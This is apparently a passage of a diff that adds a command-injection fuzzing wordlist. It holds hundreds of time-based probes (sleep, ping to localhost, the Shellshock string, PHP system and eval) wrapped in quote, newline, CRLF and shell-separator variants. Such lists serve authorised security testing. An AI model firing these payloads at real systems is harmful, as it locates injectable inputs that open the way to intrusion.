+'$(ping -c 20 127.0.0.1)||
+'$(ping -c 20 127.0.0.1);
+'$(ping -c 20 127.0.0.1)%00
+'$(ping -c 20 127.0.0.1)#
+'`ping -c 20 127.0.0.1`&
+'`ping -c 20 127.0.0.1`&&
+'`ping -c 20 127.0.0.1`|
+'`ping -c 20 127.0.0.1`||
+'`ping -c 20 127.0.0.1`;
+'`ping -c 20 127.0.0.1`%00
+'`ping -c 20 127.0.0.1`#
+'{ping -c 20 127.0.0.1}&
+'{ping -c 20 127.0.0.1}&&
+'{ping -c 20 127.0.0.1}|
+'{ping -c 20 127.0.0.1}||
+'{ping -c 20 127.0.0.1};
+'{ping -c 20 127.0.0.1}%00
+'{ping -c 20 127.0.0.1}#
+'${`ping -c 20 127.0.0.1`}&
+'${`ping -c 20 127.0.0.1`}&&
+'${`ping -c 20 127.0.0.1`}|
+'${`ping -c 20 127.0.0.1`}||
+'${`ping -c 20 127.0.0.1`};
+'${`ping -c 20 127.0.0.1`}%00
+'${`ping -c 20 127.0.0.1`}#
+"{${sleep(20)}}&
+"{${sleep(20)}}&&
+"{${sleep(20)}}|
+"{${sleep(20)}}||
+"{${sleep(20)}};
+"{${sleep(20)}}%00
+"{${sleep(20)}}#
+"{${sleep(hexdec(dechex(20)))}}&
+"{${sleep(hexdec(dechex(20)))}}&&
+"{${sleep(hexdec(dechex(20)))}}|
+"{${sleep(hexdec(dechex(20)))}}||
+"{${sleep(hexdec(dechex(20)))}};
+"{${sleep(hexdec(dechex(20)))}}%00
+"{${sleep(hexdec(dechex(20)))}}#
+"() { :;}; sleep 20&
+"() { :;}; sleep 20&&
+"() { :;}; sleep 20|
+"() { :;}; sleep 20||
+"() { :;}; sleep 20;
+"() { :;}; sleep 20%00
+"() { :;}; sleep 20#
+"eval('sleep 20')&
+"eval('sleep 20')&&
+"eval('sleep 20')|
+"eval('sleep 20')||
+"eval('sleep 20');
+"eval('sleep 20')%00
+"eval('sleep 20')#
+"perl -e 'sleep(20)'&
+"perl -e 'sleep(20)'&&
+"perl -e 'sleep(20)'|
+"perl -e 'sleep(20)'||
+"perl -e 'sleep(20)';
+"perl -e 'sleep(20)'%00
+"perl -e 'sleep(20)'#
+"<?php system("sleep 20");?>&
+"<?php system("sleep 20");?>&&
+"<?php system("sleep 20");?>|
+"<?php system("sleep 20");?>||
+"<?php system("sleep 20");?>;
+"<?php system("sleep 20");?>%00
+"<?php system("sleep 20");?>#
+"sleep(20)&
+"sleep(20)&&
+"sleep(20)|
+"sleep(20)||
+"sleep(20);
+"sleep(20)%00
+"sleep(20)#
+"sleep 20&
+"sleep 20&&
+"sleep 20|
+"sleep 20||
+"sleep 20;
+"sleep 20%00
+"sleep 20#
+"system('sleep 20')&
+"system('sleep 20')&&
+"system('sleep 20')|
+"system('sleep 20')||
+"system('sleep 20');
+"system('sleep 20')%00
+"system('sleep 20')#
+"timeout 20&
+"timeout 20&&
+"timeout 20|
+"timeout 20||
+"timeout 20;
+"timeout 20%00
+"timeout 20#
+"ping -c 20 127.0.0.1&
+"ping -c 20 127.0.0.1&&
+"ping -c 20 127.0.0.1|
+"ping -c 20 127.0.0.1||
+"ping -c 20 127.0.0.1;
+"ping -c 20 127.0.0.1%00
+"ping -c 20 127.0.0.1#
+"(ping -c 20 127.0.0.1)&
+"(ping -c 20 127.0.0.1)&&
+"(ping -c 20 127.0.0.1)|
+"(ping -c 20 127.0.0.1)||
+"(ping -c 20 127.0.0.1);
+"(ping -c 20 127.0.0.1)%00
+"(ping -c 20 127.0.0.1)#
+"$(ping -c 20 127.0.0.1)&
+"$(ping -c 20 127.0.0.1)&&
+"$(ping -c 20 127.0.0.1)|
+"$(ping -c 20 127.0.0.1)||
+"$(ping -c 20 127.0.0.1);
+"$(ping -c 20 127.0.0.1)%00
+"$(ping -c 20 127.0.0.1)#
+"`ping -c 20 127.0.0.1`&
+"`ping -c 20 127.0.0.1`&&
+"`ping -c 20 127.0.0.1`|
+"`ping -c 20 127.0.0.1`||
+"`ping -c 20 127.0.0.1`;
+"`ping -c 20 127.0.0.1`%00
+"`ping -c 20 127.0.0.1`#
+"{ping -c 20 127.0.0.1}&
+"{ping -c 20 127.0.0.1}&&
+"{ping -c 20 127.0.0.1}|
+"{ping -c 20 127.0.0.1}||
+"{ping -c 20 127.0.0.1};
+"{ping -c 20 127.0.0.1}%00
+"{ping -c 20 127.0.0.1}#
+"${`ping -c 20 127.0.0.1`}&
+"${`ping -c 20 127.0.0.1`}&&
+"${`ping -c 20 127.0.0.1`}|
+"${`ping -c 20 127.0.0.1`}||
+"${`ping -c 20 127.0.0.1`};
+"${`ping -c 20 127.0.0.1`}%00
+"${`ping -c 20 127.0.0.1`}#
+\n{${sleep(20)}}&
+\n{${sleep(20)}}&&
+\n{${sleep(20)}}|
+\n{${sleep(20)}}||
+\n{${sleep(20)}};
+\n{${sleep(20)}}%00
+\n{${sleep(20)}}#
+\n{${sleep(hexdec(dechex(20)))}}&
+\n{${sleep(hexdec(dechex(20)))}}&&
+\n{${sleep(hexdec(dechex(20)))}}|
+\n{${sleep(hexdec(dechex(20)))}}||
+\n{${sleep(hexdec(dechex(20)))}};
+\n{${sleep(hexdec(dechex(20)))}}%00
+\n{${sleep(hexdec(dechex(20)))}}#
+\n() { :;}; sleep 20&
+\n() { :;}; sleep 20&&
+\n() { :;}; sleep 20|
+\n() { :;}; sleep 20||
+\n() { :;}; sleep 20;
+\n() { :;}; sleep 20%00
+\n() { :;}; sleep 20#
+\neval('sleep 20')&
+\neval('sleep 20')&&
+\neval('sleep 20')|
+\neval('sleep 20')||
+\neval('sleep 20');
+\neval('sleep 20')%00
+\neval('sleep 20')#
+\nperl -e 'sleep(20)'&
+\nperl -e 'sleep(20)'&&
+\nperl -e 'sleep(20)'|
+\nperl -e 'sleep(20)'||
+\nperl -e 'sleep(20)';
+\nperl -e 'sleep(20)'%00
+\nperl -e 'sleep(20)'#
+\n<?php system("sleep 20");?>&
+\n<?php system("sleep 20");?>&&
+\n<?php system("sleep 20");?>|
+\n<?php system("sleep 20");?>||
+\n<?php system("sleep 20");?>;
+\n<?php system("sleep 20");?>%00
+\n<?php system("sleep 20");?>#
+\nsleep(20)&
+\nsleep(20)&&
+\nsleep(20)|
+\nsleep(20)||
+\nsleep(20);
+\nsleep(20)%00
+\nsleep(20)#
+\nsleep 20&
+\nsleep 20&&
+\nsleep 20|
+\nsleep 20||
+\nsleep 20;
+\nsleep 20%00
+\nsleep 20#
+\nsystem('sleep 20')&
+\nsystem('sleep 20')&&
+\nsystem('sleep 20')|
+\nsystem('sleep 20')||
+\nsystem('sleep 20');
+\nsystem('sleep 20')%00
+\nsystem('sleep 20')#
+\ntimeout 20&
+\ntimeout 20&&
+\ntimeout 20|
+\ntimeout 20||
+\ntimeout 20;
+\ntimeout 20%00
+\ntimeout 20#
+\nping -c 20 127.0.0.1&
+\nping -c 20 127.0.0.1&&
+\nping -c 20 127.0.0.1|
+\nping -c 20 127.0.0.1||
+\nping -c 20 127.0.0.1;
+\nping -c 20 127.0.0.1%00
+\nping -c 20 127.0.0.1#
+\n(ping -c 20 127.0.0.1)&
+\n(ping -c 20 127.0.0.1)&&
+\n(ping -c 20 127.0.0.1)|
+\n(ping -c 20 127.0.0.1)||
+\n(ping -c 20 127.0.0.1);
+\n(ping -c 20 127.0.0.1)%00
+\n(ping -c 20 127.0.0.1)#
+\n$(ping -c 20 127.0.0.1)&
+\n$(ping -c 20 127.0.0.1)&&
+\n$(ping -c 20 127.0.0.1)|
+\n$(ping -c 20 127.0.0.1)||
+\n$(ping -c 20 127.0.0.1);
+\n$(ping -c 20 127.0.0.1)%00
+\n$(ping -c 20 127.0.0.1)#
+\n`ping -c 20 127.0.0.1`&
+\n`ping -c 20 127.0.0.1`&&
+\n`ping -c 20 127.0.0.1`|
+\n`ping -c 20 127.0.0.1`||
+\n`ping -c 20 127.0.0.1`;
+\n`ping -c 20 127.0.0.1`%00
+\n`ping -c 20 127.0.0.1`#
+\n{ping -c 20 127.0.0.1}&
+\n{ping -c 20 127.0.0.1}&&
+\n{ping -c 20 127.0.0.1}|
+\n{ping -c 20 127.0.0.1}||
+\n{ping -c 20 127.0.0.1};
+\n{ping -c 20 127.0.0.1}%00
+\n{ping -c 20 127.0.0.1}#
+\n${`ping -c 20 127.0.0.1`}&
+\n${`ping -c 20 127.0.0.1`}&&
+\n${`ping -c 20 127.0.0.1`}|
+\n${`ping -c 20 127.0.0.1`}||
+\n${`ping -c 20 127.0.0.1`};
+\n${`ping -c 20 127.0.0.1`}%00
+\n${`ping -c 20 127.0.0.1`}#
+%0d%0a{${sleep(20)}}&
+%0d%0a{${sleep(20)}}&&
+%0d%0a{${sleep(20)}}|
+%0d%0a{${sleep(20)}}||
+%0d%0a{${sleep(20)}};
+%0d%0a{${sleep(20)}}%00
+%0d%0a{${sleep(20)}}#
+%0d%0a{${sleep(hexdec(dechex(20)))}}&
+%0d%0a{${sleep(hexdec(dechex(20)))}}&&
+%0d%0a{${sleep(hexdec(dechex(20)))}}|
+%0d%0a{${sleep(hexdec(dechex(20)))}}||
+%0d%0a{${sleep(hexdec(dechex(20)))}};
+%0d%0a{${sleep(hexdec(dechex(20)))}}%00
+%0d%0a{${sleep(hexdec(dechex(20)))}}#
+%0d%0a() { :;}; sleep 20&
+%0d%0a() { :;}; sleep 20&&
+%0d%0a() { :;}; sleep 20|
+%0d%0a() { :;}; sleep 20||
+%0d%0a() { :;}; sleep 20;
+%0d%0a() { :;}; sleep 20%00
+%0d%0a() { :;}; sleep 20#
+%0d%0aeval('sleep 20')&
+%0d%0aeval('sleep 20')&&
+%0d%0aeval('sleep 20')|
+%0d%0aeval('sleep 20')||
+%0d%0aeval('sleep 20');
+%0d%0aeval('sleep 20')%00
+%0d%0aeval('sleep 20')#
+%0d%0aperl -e 'sleep(20)'&
+%0d%0aperl -e 'sleep(20)'&&
+%0d%0aperl -e 'sleep(20)'|
+%0d%0aperl -e 'sleep(20)'||
+%0d%0aperl -e 'sleep(20)';
+%0d%0aperl -e 'sleep(20)'%00
+%0d%0aperl -e 'sleep(20)'#
+%0d%0a<?php system("sleep 20");?>&
+%0d%0a<?php system("sleep 20");?>&&
+%0d%0a<?php system("sleep 20");?>|
+%0d%0a<?php system("sleep 20");?>||
+%0d%0a<?php system("sleep 20");?>;
+%0d%0a<?php system("sleep 20");?>%00
+%0d%0a<?php system("sleep 20");?>#
+%0d%0asleep(20)&
+%0d%0asleep(20)&&
+%0d%0asleep(20)|
+%0d%0asleep(20)||
+%0d%0asleep(20);
+%0d%0asleep(20)%00
+%0d%0asleep(20)#
+%0d%0asleep 20&
+%0d%0asleep 20&&
+%0d%0asleep 20|
+%0d%0asleep 20||
+%0d%0asleep 20;
+%0d%0asleep 20%00
+%0d%0asleep 20#
+%0d%0asystem('sleep 20')&
+%0d%0asystem('sleep 20')&&
+%0d%0asystem('sleep 20')|
+%0d%0asystem('sleep 20')||
+%0d%0asystem('sleep 20');
+%0d%0asystem('sleep 20')%00
+%0d%0asystem('sleep 20')#
+%0d%0atimeout 20&
+%0d%0atimeout 20&&
+%0d%0atimeout 20|
+%0d%0atimeout 20||
+%0d%0atimeout 20;
+%0d%0atimeout 20%00
+%0d%0atimeout 20#
+%0d%0aping -c 20 127.0.0.1&
+%0d%0aping -c 20 127.0.0.1&&
+%0d%0aping -c 20 127.0.0.1|
+%0d%0aping -c 20 127.0.0.1||
+%0d%0aping -c 20 127.0.0.1;
+%0d%0aping -c 20 127.0.0.1%00
+%0d%0aping -c 20 127.0.0.1#
+%0d%0a(ping -c 20 127.0.0.1)&
+%0d%0a(ping -c 20 127.0.0.1)&&
+%0d%0a(ping -c 20 127.0.0.1)|
+%0d%0a(ping -c 20 127.0.0.1)||
+%0d%0a(ping -c 20 127.0.0.1);
+%0d%0a(ping -c 20 127.0.0.1)%00
+%0d%0a(ping -c 20 127.0.0.1)#
+%0d%0a$(ping -c 20 127.0.0.1)&
+%0d%0a$(ping -c 20 127.0.0.1)&&
+%0d%0a$(ping -c 20 127.0.0.1)|
+%0d%0a$(ping -c 20 127.0.0.1)||
+%0d%0a$(ping -c 20 127.0.0.1);
+%0d%0a$(ping -c 20 127.0.0.1)%00
+%0d%0a$(ping -c 20 127.0.0.1)#
+%0d%0a`ping -c 20 127.0.0.1`&
+%0d%0a`ping -c 20 127.0.0.1`&&
+%0d%0a`ping -c 20 127.0.0.1`|
+%0d%0a`ping -c 20 127.0.0.1`||
+%0d%0a`ping -c 20 127.0.0.1`;
+%0d%0a`ping -c 20 127.0.0.1`%00
+%0d%0a`ping -c 20 127.0.0.1`#
+%0d%0a{ping -c 20 127.0.0.1}&
+%0d%0a{ping -c 20 127.0.0.1}&&
+%0d%0a{ping -c 20 127.0.0.1}|
+%0d%0a{ping -c 20 127.0.0.1}||
+%0d%0a{ping -c 20 127.0.0.1};
+%0d%0a{ping -c 20 127.0.0.1}%00
+%0d%0a{ping -c 20 127.0.0.1}#
+%0d%0a${`ping -c 20 127.0.0.1`}&
+%0d%0a${`ping -c 20 127.0.0.1`}&&
+%0d%0a${`ping -c 20 127.0.0.1`}|
+%0d%0a${`ping -c 20 127.0.0.1`}||
+%0d%0a${`ping -c 20 127.0.0.1`};
+%0d%0a${`ping -c 20 127.0.0.1`}%00
+%0d%0a${`ping -c 20 127.0.0.1`}#
+;{${sleep(20)}}&
+;{${sleep(20)}}&&
+;{${sleep(20)}}|
+;{${sleep(20)}}||
+;{${sleep(20)}};
+;{${sleep(20)}}%00
+;{${sleep(20)}}#
+;{${sleep(hexdec(dechex(20)))}}&
+;{${sleep(hexdec(dechex(20)))}}&&
+;{${sleep(hexdec(dechex(20)))}}|
+;{${sleep(hexdec(dechex(20)))}}||
+;{${sleep(hexdec(dechex(20)))}};
+;{${sleep(hexdec(dechex(20)))}}%00
+;{${sleep(hexdec(dechex(20)))}}#
+;() { :;}; sleep 20&
+;() { :;}; sleep 20&&
+;() { :;}; sleep 20|
+;() { :;}; sleep 20||
+;() { :;}; sleep 20;
+;() { :;}; sleep 20%00
+;() { :;}; sleep 20#
+;eval('sleep 20')&
+;eval('sleep 20')&&
+;eval('sleep 20')|
+;eval('sleep 20')||
+;eval('sleep 20');
+;eval('sleep 20')%00
+;eval('sleep 20')#
+;perl -e 'sleep(20)'&
+;perl -e 'sleep(20)'&&
+;perl -e 'sleep(20)'|
+;perl -e 'sleep(20)'||
+;perl -e 'sleep(20)';
+;perl -e 'sleep(20)'%00
+;perl -e 'sleep(20)'#
+;<?php system("sleep 20");?>&
+;<?php system("sleep 20");?>&&
+;<?php system("sleep 20");?>|
+;<?php system("sleep 20");?>||
+;<?php system("sleep 20");?>;
+;<?php system("sleep 20");?>%00
+;<?php system("sleep 20");?>#
+;sleep(20)&
+;sleep(20)&&
+;sleep(20)|
+;sleep(20)||
+;sleep(20);
+;sleep(20)%00
+;sleep(20)#
+;sleep 20&
+;sleep 20&&
+;sleep 20|
+;sleep 20||
+;sleep 20;
+;sleep 20%00
+;sleep 20#
+;system('sleep 20')&
+;system('sleep 20')&&
+;system('sleep 20')|
+;system('sleep 20')||
+;system('sleep 20');
+;system('sleep 20')%00
+;system('sleep 20')#
+;timeout 20&
+;timeout 20&&
+;timeout 20|
+;timeout 20||
+;timeout 20;
+;timeout 20%00
+;timeout 20#
+;ping -c 20 127.0.0.1&
+;ping -c 20 127.0.0.1&&
+;ping -c 20 127.0.0.1|
+;ping -c 20 127.0.0.1||
+;ping -c 20 127.0.0.1;
+;ping -c 20 127.0.0.1%00
+;ping -c 20 127.0.0.1#
+;(ping -c 20 127.0.0.1)&
+;(ping -c 20 127.0.0.1)&&
+;(ping -c 20 127.0.0.1)|
+;(ping -c 20 127.0.0.1)||
+;(ping -c 20 127.0.0.1);
+;(ping -c 20 127.0.0.1)%00
+;(ping -c 20 127.0.0.1)#
+;$(ping -c 20 127.0.0.1)&
+;$(ping -c 20 127.0.0.1)&&
+;$(ping -c 20 127.0.0.1)|
+;$(ping -c 20 127.0.0.1)||
+;$(ping -c 20 127.0.0.1);
+;$(ping -c 20 127.0.0.1)%00
+;$(ping -c 20 127.0.0.1)#
+;`ping -c 20 127.0.0.1`&
+;`ping -c 20 127.0.0.1`&&
+;`ping -c 20 127.0.0.1`|
+;`ping -c 20 127.0.0.1`||
+;`ping -c 20 127.0.0.1`;
+;`ping -c 20 127.0.0.1`%00
+;`ping -c 20 127.0.0.1`#
+;{ping -c 20 127.0.0.1}&
+;{ping -c 20 127.0.0.1}&&
+;{ping -c 20 127.0.0.1}|
+;{ping -c 20 127.0.0.1}||
+;{ping -c 20 127.0.0.1};
+;{ping -c 20 127.0.0.1}%00
+;{ping -c 20 127.0.0.1}#
+;${`ping -c 20 127.0.0.1`}&
+;${`ping -c 20 127.0.0.1`}&&
+;${`ping -c 20 127.0.0.1`}|
+;${`ping -c 20 127.0.0.1`}||
+;${`ping -c 20 127.0.0.1`};
+;${`ping -c 20 127.0.0.1`}%00
+;${`ping -c 20 127.0.0.1`}#
+|{${sleep(20)}}&
+|{${sleep(20)}}&&
+|{${sleep(20)}}|
+|{${sleep(20)}}||
+|{${sleep(20)}};
+|{${sleep(20)}}%00
+|{${sleep(20)}}#
+|{${sleep(hexdec(dechex(20)))}}&
+|{${sleep(hexdec(dechex(20)))}}&&
+|{${sleep(hexdec(dechex(20)))}}|
+|{${sleep(hexdec(dechex(20)))}}||
+|{${sleep(hexdec(dechex(20)))}};
+|{${sleep(hexdec(dechex(20)))}}%00
+|{${sleep(hexdec(dechex(20)))}}#
+|() { :;}; sleep 20&
+|() { :;}; sleep 20&&
+|() { :;}; sleep 20|
+|() { :;}; sleep 20||
+|() { :;}; sleep 20;
+|() { :;}; sleep 20%00
+|() { :;}; sleep 20#
+|eval('sleep 20')&
+|eval('sleep 20')&&
+|eval('sleep 20')|
+|eval('sleep 20')||
+|eval('sleep 20');
+|eval('sleep 20')%00
+|eval('sleep 20')#
+|perl -e 'sleep(20)'&
+|perl -e 'sleep(20)'&&
+|perl -e 'sleep(20)'|
+|perl -e 'sleep(20)'||
+|perl -e 'sleep(20)';
+|perl -e 'sleep(20)'%00
+|perl -e 'sleep(20)'#
+|<?php system("sleep 20");?>&
+|<?php system("sleep 20");?>&&
+|<?php system("sleep 20");?>|
+|<?php system("sleep 20");?>||
+|<?php system("sleep 20");?>;
+|<?php system("sleep 20");?>%00
+|<?php system("sleep 20");?>#
+|sleep(20)&
+|sleep(20)&&
+|sleep(20)|
+|sleep(20)||
+|sleep(20);
+|sleep(20)%00
+|sleep(20)#
+|sleep 20&
+|sleep 20&&
+|sleep 20|
+|sleep 20||
+|sleep 20;
+|sleep 20%00
+|sleep 20#
+|system('sleep 20')&
+|system('sleep 20')&&
+|system('sleep 20')|
+|system('sleep 20')||
+|system('sleep 20');
+|system('sleep 20')%00
+|system('sleep 20')#
+|timeout 20&
+|timeout 20&&
+|timeout 20|
+|timeout 20||
+|timeout 20;
+|timeout 20%00
+|timeout 20#
+|ping -c 20 127.0.0.1&
+|ping -c 20 127.0.0.1&&
+|ping -c 20 127.0.0.1|
+|ping -c 20 127.0.0.1||
+|ping -c 20 127.0.0.1;
+|ping -c 20 127.0.0.1%00
+|ping -c 20 127.0.0.1#
+|(ping -c 20 127.0.0.1)&
+|(ping -c 20 127.0.0.1)&&
+|(ping -c 20 127.0.0.1)|
+|(ping -c 20 127.0.0.1)||
+|(ping -c 20 127.0.0.1);
+|(ping -c 20 127.0.0.1)%00
+|(ping -c 20 127.0.0.1)#
+|$(ping -c 20 127.0.0.1)&
+|$(ping -c 20 127.0.0.1)&&
+|$(ping -c 20 127.0.0.1)|
+|$(ping -c 20 127.0.0.1)||
+|$(ping -c 20 127.0.0.1);
+|$(ping -c 20 127.0.0.1)%00
+|$(ping -c 20 127.0.0.1)#
+|`ping -c 20 127.0.0.1`&
+|`ping -c 20 127.0.0.1`&&
+|`ping -c 20 127.0.0.1`|
+|`ping -c 20 127.0.0.1`||
+|`ping -c 20 127.0.0.1`;
+|`ping -c 20 127.0.0.1`%00
+|`ping -c 20 127.0.0.1`#
+|{ping -c 20 127.0.0.1}&
+|{ping -c 20 127.0.0.1}&&
+|{ping -c 20 127.0.0.1}|
+|{ping -c 20 127.0.0.1}||
+|{ping -c 20 127.0.0.1};
+|{ping -c 20 127.0.0.1}%00
+|{ping -c 20 127.0.0.1}#
+|${`ping -c 20 127.0.0.1`}&
+|${`ping -c 20 127.0.0.1`}&&
+|${`ping -c 20 127.0.0.1`}|
+|${`ping -c 20 127.0.0.1`}||
+|${`ping -c 20 127.0.0.1`};
+|${`ping -c 20 127.0.0.1`}%00
+|${`ping -c 20 127.0.0.1`}#
+||{${sleep(20)}}&
+||{${sleep(20)}}&&
+||{${sleep(20)}}|
+||{${sleep(20)}}||
+||{${sleep(20)}};
+||{${sleep(20)}}%00
+||{${sleep(20)}}#
+||{${sleep(hexdec(dechex(20)))}}&
+||{${sleep(hexdec(dechex(20)))}}&&
+||{${sleep(hexdec(dechex(20)))}}|
+||{${sleep(hexdec(dechex(20)))}}||
+||{${sleep(hexdec(dechex(20)))}};
+||{${sleep(hexdec(dechex(20)))}}%00
+||{${sleep(hexdec(dechex(20)))}}#
+||() { :;}; sleep 20&
+||() { :;}; sleep 20&&
+||() { :;}; sleep 20|
+||() { :;}; sleep 20||
+||() { :;}; sleep 20;
+||() { :;}; sleep 20%00
+||() { :;}; sleep 20#
+||eval('sleep 20')&
+||eval('sleep 20')&&
+||eval('sleep 20')|
+||eval('sleep 20')||
+||eval('sleep 20');
+||eval('sleep 20')%00
+||eval('sleep 20')#
+||perl -e 'sleep(20)'&
+||perl -e 'sleep(20)'&&
+||perl -e 'sleep(20)'|
+||perl -e 'sleep(20)'||
+||perl -e 'sleep(20)';
+||perl -e 'sleep(20)'%00
+||perl -e 'sleep(20)'#
+||<?php system("sleep 20");?>&
+||<?php system("sleep 20");?>&&
+||<?php system("sleep 20");?>|
+||<?php system("sleep 20");?>||
+||<?php system("sleep 20");?>;
+||<?php system("sleep 20");?>%00
+||<?php system("sleep 20");?>#
+||sleep(20)&
+||sleep(20)&&
+||sleep(20)|
+||sleep(20)||
+||sleep(20);
+||sleep(20)%00
+||sleep(20)#
+||sleep 20&
+||sleep 20&&
+||sleep 20|
+||sleep 20||
+||sleep 20;
+||sleep 20%00
+||sleep 20#
+||system('sleep 20')&
+||system('sleep 20')&&
+||system('sleep 20')|
+||system('sleep 20')||
+||system('sleep 20');
+||system('sleep 20')%00
+||system('sleep 20')#
+||timeout 20&
+||timeout 20&&
+||timeout 20|
+||timeout 20||
+||timeout 20;
+||timeout 20%00
+||timeout 20#
+||ping -c 20 127.0.0.1&
+||ping -c 20 127.0.0.1&&
+||ping -c 20 127.0.0.1|
+||ping -c 20 127.0.0.1||
+||ping -c 20 127.0.0.1;
+||ping -c 20 127.0.0.1%00
+||ping -c 20 127.0.0.1#
+||(ping -c 20 127.0.0.1)&
+||(ping -c 20 127.0.0.1)&&
+||(ping -c 20 127.0.0.1)|
+||(ping -c 20 127.0.0.1)||
+||(ping -c 20 127.0.0.1);
+||(ping -c 20 127.0.0.1)%00
+||(ping -c 20 127.0.0.1)#
+||$(ping -c 20 127.0.0.1)&
+||$(ping -c 20 127.0.0.1)&&
+||$(ping -c 20 127.0.0.1)|
+||$(ping -c 20 127.0.0.1)||
+||$(ping -c 20 127.0.0.1);
+||$(ping -c 20 127.0.0.1)%00
+||$(ping -c 20 127.0.0.1)#
+||`ping -c 20 127.0.0.1`&
+||`ping -c 20 127.0.0.1`&&
+||`ping -c 20 127.0.0.1`|
+||`ping -c 20 127.0.0.1`||
+||`ping -c 20 127.0.0.1`;
+||`ping -c 20 127.0.0.1`%00
+||`ping -c 20 127.0.0.1`#
+||{ping -c 20 127.0.0.1}&
+||{ping -c 20 127.0.0.1}&&
+||{ping -c 20 127.0.0.1}|
+||{ping -c 20 127.0.0.1}||
+||{ping -c 20 127.0.0.1};
+||{ping -c 20 127.0.0.1}%00
+||{ping -c 20 127.0.0.1}#
+||${`ping -c 20 127.0.0.1`}&
+||${`ping -c 20 127.0.0.1`}&&
+||${`ping -c 20 127.0.0.1`}|
+||${`ping -c 20 127.0.0.1`}||
+||${`ping -c 20 127.0.0.1`};
+||${`ping -c 20 127.0.0.1`}%00
+||${`ping -c 20 127.0.0.1`}#
+&{${sleep(20)}}&
+&{${sleep(20)}}&&
+&{${sleep(20)}}|
+&{${sleep(20)}}||
+&{${sleep(20)}};
+&{${sleep(20)}}%00
+&{${sleep(20)}}#
+&{${sleep(hexdec(dechex(20)))}}&
+&{${sleep(hexdec(dechex(20)))}}&&
+&{${sleep(hexdec(dechex(20)))}}|
+&{${sleep(hexdec(dechex(20)))}}||
+&{${sleep(hexdec(dechex(20)))}};
+&{${sleep(hexdec(dechex(20)))}}%00
+&{${sleep(hexdec(dechex(20)))}}#
+&() { :;}; sleep 20&
+&() { :;}; sleep 20&&
+&() { :;}; sleep 20|
+&() { :;}; sleep 20||
+&() { :;}; sleep 20;
+&() { :;}; sleep 20%00
+&() { :;}; sleep 20#
+&eval('sleep 20')&
+&eval('sleep 20')&&
+&eval('sleep 20')|
+&eval('sleep 20')||
+&eval('sleep 20');
+&eval('sleep 20')%00
+&eval('sleep 20')#
+&perl -e 'sleep(20)'&
+&perl -e 'sleep(20)'&&
+&perl -e 'sleep(20)'|
+&perl -e 'sleep(20)'||
+&perl -e 'sleep(20)';
+&perl -e 'sleep(20)'%00
+&perl -e 'sleep(20)'#
+&<?php system("sleep 20");?>&
+&<?php system("sleep 20");?>&&
+&<?php system("sleep 20");?>|
+&<?php system("sleep 20");?>||
+&<?php system("sleep 20");?>;
+&<?php system("sleep 20");?>%00
+&<?php system("sleep 20");?>#
+&sleep(20)&
+&sleep(20)&&
+&sleep(20)|
+&sleep(20)||
+&sleep(20);
+&sleep(20)%00
+&sleep(20)#
+&sleep 20&
+&sleep 20&&
+&sleep 20|
+&sleep 20||
+&sleep 20;
+&sleep 20%00
+&sleep 20#
+&system('sleep 20')&
+&system('sleep 20')&&
+&system('sleep 20')|
+&system('sleep 20')||
+&system('sleep 20');
+&system('sleep 20')%00
+&system('sleep 20')#
+&timeout 20&
+&timeout 20&&
+&timeout 20|
+&timeout 20||
+&timeout 20;
+&timeout 20%00
+&timeout 20#
+&ping -c 20 127.0.0.1&
+&ping -c 20 127.0.0.1&&
+&ping -c 20 127.0.0.1|
+&ping -c 20 127.0.0.1||
+&ping -c 20 127.0.0.1;
+&ping -c 20 127.0.0.1%00
+&ping -c 20 127.0.0.1#
+&(ping -c 20 127.0.0.1)&
+&(ping -c 20 127.0.0.1)&&
+&(ping -c 20 127.0.0.1)|
+&(ping -c 20 127.0.0.1)||
+&(ping -c 20 127.0.0.1);
+&(ping -c 20 127.0.0.1)%00
+&(ping -c 20 127.0.0.1)#
+&$(ping -c 20 127.0.0.1)&
+&$(ping -c 20 127.0.0.1)&&
+&$(ping -c 20 127.0.0.1)|
+&$(ping -c 20 127.0.0.1)||
+&$(ping -c 20 127.0.0.1);
+&$(ping -c 20 127.0.0.1)%00
+&$(ping -c 20 127.0.0.1)#
+&`ping -c 20 127.0.0.1`&
+&`ping -c 20 127.0.0.1`&&
+&`ping -c 20 127.0.0.1`|
+&`ping -c 20 127.0.0.1`||
+&`ping -c 20 127.0.0.1`;
+&`ping -c 20 127.0.0.1`%00
+&`ping -c 20 127.0.0.1`#
+&{ping -c 20 127.0.0.1}&
+&{ping -c 20 127.0.0.1}&&
+&{ping -c 20 127.0.0.1}|
+&{ping -c 20 127.0.0.1}||
+&{ping -c 20 127.0.0.1};
+&{ping -c 20 127.0.0.1}%00
+&{ping -c 20 127.0.0.1}#
+&${`ping -c 20 127.0.0.1`}&
+&${`ping -c 20 127.0.0.1`}&&
+&${`ping -c 20 127.0.0.1`}|
+&${`ping -c 20 127.0.0.1`}||
+&${`ping -c 20 127.0.0.1`};
+&${`ping -c 20 127.0.0.1`}%00
+&${`ping -c 20 127.0.0.1`}#
+&&{${sleep(20)}}&
+&&{${sleep(20)}}&&
+&&{${sleep(20)}}|
+&&{${sleep(20)}}||
+&&{${sleep(20)}};
+&&{${sleep(20)}}%00
+&&{${sleep(20)}}#
+&&{${sleep(hexdec(dechex(20)))}}&
+&&{${sleep(hexdec(dechex(20)))}}&&
+&&{${sleep(hexdec(dechex(20)))}}|
+&&{${sleep(hexdec(dechex(20)))}}||
+&&{${sleep(hexdec(dechex(20)))}};
+&&{${sleep(hexdec(dechex(20)))}}%00
+&&{${sleep(hexdec(dechex(20)))}}#
+&&() { :;}; sleep 20&
+&&() { :;}; sleep 20&&
+&&() { :;}; sleep 20|
+&&() { :;}; sleep 20||
+&&() { :;}; sleep 20;
+&&() { :;}; sleep 20%00
+&&() { :;}; sleep 20#
+&&eval('sleep 20')&
+&&eval('sleep 20')&&
+&&eval('sleep 20')|
+&&eval('sleep 20')||
+&&eval('sleep 20');
+&&eval('sleep 20')%00
+&&eval('sleep 20')#
+&&perl -e 'sleep(20)'&
+&&perl -e 'sleep(20)'&&
+&&perl -e 'sleep(20)'|
+&&perl -e 'sleep(20)'||
+&&perl -e 'sleep(20)';
+&&perl -e 'sleep(20)'%00
+&&perl -e 'sleep(20)'#
+&&<?php system("sleep 20");?>&
+&&<?php system("sleep 20");?>&&
+&&<?php system("sleep 20");?>|
+&&<?php system("sleep 20");?>||
+&&<?php system("sleep 20");?>;
+&&<?php system("sleep 20");?>%00
+&&<?php system("sleep 20");?>#
+&&sleep(20)&
+&&sleep(20)&&
+&&sleep(20)|
+&&sleep(20)||
+&&sleep(20);
+&&sleep(20)%00
+&&sleep(20)#
+&&sleep 20&
+&&sleep 20&&
+&&sleep 20|
+&&sleep 20||
